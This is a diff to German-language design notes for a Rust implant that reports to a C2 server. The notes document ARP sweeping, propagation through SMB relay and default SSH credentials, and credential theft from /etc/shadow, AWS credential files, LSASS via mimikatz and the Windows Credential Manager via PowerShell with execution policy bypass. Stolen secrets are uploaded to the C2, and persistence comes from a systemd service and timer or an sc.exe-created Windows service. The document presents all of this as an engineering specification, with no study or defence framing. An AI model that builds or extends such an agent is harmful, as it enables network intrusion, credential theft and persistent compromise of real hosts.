@@ -133,9 +133,20 @@ Status→Fehler stehen dort, nicht in diesem Crate.
 - Der Host-Status wird nur bei erfolgreichem Exploit von `discovered` auf `compromised` gehoben; der Fehlerpfad des SMB-Relay lässt ihn auf `discovered` [propagate.rs:run_propagation].
 - Der unter unix geschriebene systemd-Unit startet das Binary mit allen
   Pflichtargumenten: `--server`, `--token`, `--server-cert`, `--iface`, `--start`,
-  `--end` und `--own-ip`. Ein leerer `ExecStart` zusammen mit `Restart=always`
-  und `RestartSec=5` wäre eine Neustart-Schleife gewesen — der Agent startet
-  nie durch [main.rs:install_persistence] [kx-posix/src/persist.rs:systemd_unit_content](../../kx-posix/src/persist.rs).
+  `--end`, `--own-ip` und `--relay-script`. Die Unit ist ein Einmal-Lauf
+  (`Type=oneshot`, `Restart=no`) und setzt `WorkingDirectory` auf das
+  Verzeichnis des Binaries — `Type=simple` mit `Restart=always` wäre eine
+  Neustart-Schleife gewesen, weil `main()` linear endet
+  [main.rs:install_persistence] [kx-posix/src/persist.rs:systemd_unit_content](../../kx-posix/src/persist.rs).
+- Der Takt kommt nicht aus der Unit, sondern aus dem Timer
+  (`kx-agent.timer`, `OnBootSec=2min`, `OnUnitActiveSec=5min`,
+  `Persistent=true`); die Service-Unit hängt an ihm
+  [kx-posix/src/persist.rs:systemd_timer_content](../../kx-posix/src/persist.rs).
+- Der Pfad des Relay-Skripts wird **neben dem Binary** gesucht
+  (`<binary-dir>/assets/smbrelayx.py`); gibt es das dort nicht, bleibt der
+  relative Pfad stehen. Der persistierte Agent bekommt den aufgelösten
+  Pfad fest in die Argumentliste eingetragen
+  [main.rs:resolve_relay_script] [main.rs:Args::persistence_invocation].
 - Das Token steht **nicht** im Klartext in der Unit-Datei: sie ist für jeden
   lesbar, der die Datei lesen darf. Die Unit referenziert `${KX_C2_TOKEN}`, das
   systemd aus der Environment-Datei `/etc/kx/kx-agent.env` (0600) auflöst
@@ -147,6 +158,7 @@ Status→Fehler stehen dort, nicht in diesem Crate.
 - Die für den ARP-Sweep verwendete MAC-Adresse ist der Platzhalter `own_mac = [0x00; 6]` [main.rs:main].
 - Der Logfilter stammt aus `tracing_subscriber::EnvFilter::try_from_default_env()` (liest `RUST_LOG`) und fällt bei Fehlschlag auf `"info"` zurück [main.rs:main].
 - `std::process::exit(1)` wird bei fehlgeschlagener C2-Client-Initialisierung und bei fehlgeschlagenem ARP-Sweep ausgelöst [main.rs:main].
+- `std::process::exit(1)` wird am Ende des Laufs ausgelöst, wenn die Selbstregistrierung fehlgeschlagen ist oder wenn es mindestens ein Secret gab, aber **kein** Upload geklappt hat. Ein Host ohne jeden Fund ist kein Fehlschlag — der Lauf hat den C2 erreicht. Ein Lauf, der nichts erreicht, meldet keinen Erfolg [main.rs:main].
 - Fehler beim Upload lokaler Secrets werden geloggt, die Schleife läuft weiter; in der Reporting-Phase werden die Resultate von `register_host` und `upload_secret` verworfen (`let _ =`) [main.rs:main].
 - Feste `cred_type`/`source`-Paare: Windows-LSASS nutzt `secret_type` mit Quelle `"lsass"`, Credential Manager nutzt `"credential_manager"` mit Quelle `"cmdkey"`; unix nutzt `"shadow"` mit Quelle `"/etc/shadow"` und `"aws"` mit Quelle `"~/.aws/credentials"` [main.rs:collect_local_secrets].
 - Erbeutete Credentials werden mit festen Werten erfasst: SMB-Relay als `cred_type` `"nt_hash"` mit Quelle `"smb_relay"`, SSH-Default-Credentials als `cred_type` `"password"` mit Quelle `"default_creds"` [main.rs:collect_local_secrets] [propagate.rs:run_propagation].
@@ -171,7 +183,8 @@ Status→Fehler stehen dort, nicht in diesem Crate.
 - `[main.rs:main]` — Meldet alle propagierten Hosts und Secrets per `client.register_host(h)` und `client.upload_secret(s)` an den C2-Server; die Rückgabewerte werden verworfen (`let _ =`).
 - `[main.rs:install_persistence]` — Liest den Pfad der eigenen Executable über `std::env::current_exe()`.
 - `[main.rs:install_persistence]` — Installiert und startet unter Windows den Dienst via `kx_win::install_service("kx-agent", &exe, "Kx Agent")` und `kx_win::start_service("kx-agent")`; unter unix via `kx_posix::install_systemd_service(&SystemdService { … })`.
-- `[main.rs:install_persistence]` — Schreibt unter unix die Unit-Datei `/etc/systemd/system/kx-agent.service`, die Environment-Datei `/etc/kx/kx-agent.env` (0600, Verzeichnis 0700) und führt `systemctl daemon-reload` sowie `systemctl enable kx-agent` aus [kx-posix/src/persist.rs:install_systemd_service](../../kx-posix/src/persist.rs).
+- `[main.rs:install_persistence]` — Schreibt unter unix die Unit-Datei `/etc/systemd/system/kx-agent.service`, die Timer-Datei `/etc/systemd/system/kx-agent.timer` und die Environment-Datei `/etc/kx/kx-agent.env` (0600, Verzeichnis 0700); jede Datei nur, wenn sich ihr Inhalt ändert. Führt `systemctl daemon-reload` (nur nach einer Änderung), `systemctl enable kx-agent` und `systemctl enable --now kx-agent.timer` aus [kx-posix/src/persist.rs:install_systemd_service](../../kx-posix/src/persist.rs).
+- `[main.rs:resolve_relay_script]` — Prüft, ob der Assetpfad neben dem Binary liegt (`<binary-dir>/assets/smbrelayx.py`), und gibt sonst den relativen Pfad zurück; der persistierte Agent bekommt den aufgelösten Pfad in seiner Argumentliste.
 - `[main.rs:install_persistence]` — Spawnt unter Windows `cmd.exe /C sc.exe create kx-agent binPath= "<exe>" start= auto DisplayName= "Kx Agent"` und danach `sc.exe start kx-agent` [kx-win/src/persist.rs:install_service](../../kx-win/src/persist.rs) [kx-win/src/persist.rs:start_service](../../kx-win/src/persist.rs).
 - `[main.rs:collect_local_secrets]` — Liest unter unix `/etc/shadow` [kx-posix/src/secrets.rs:extract_shadow_hashes](../../kx-posix/src/secrets.rs) und `$HOME/.aws/credentials` (mit `HOME` als Env-Variable, Fallback `/root`) [kx-posix/src/secrets.rs:extract_aws_credentials](../../kx-posix/src/secrets.rs).
 - `[main.rs:collect_local_secrets]` — Spawnt unter Windows `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ...` für den Credential Manager [kx-win/src/secrets.rs:extract_credential_manager](../../kx-win/src/secrets.rs) und `mimikatz.exe sekurlsa::logonpasswords` für LSASS [kx-win/src/secrets.rs:extract_lsass](../../kx-win/src/secrets.rs).
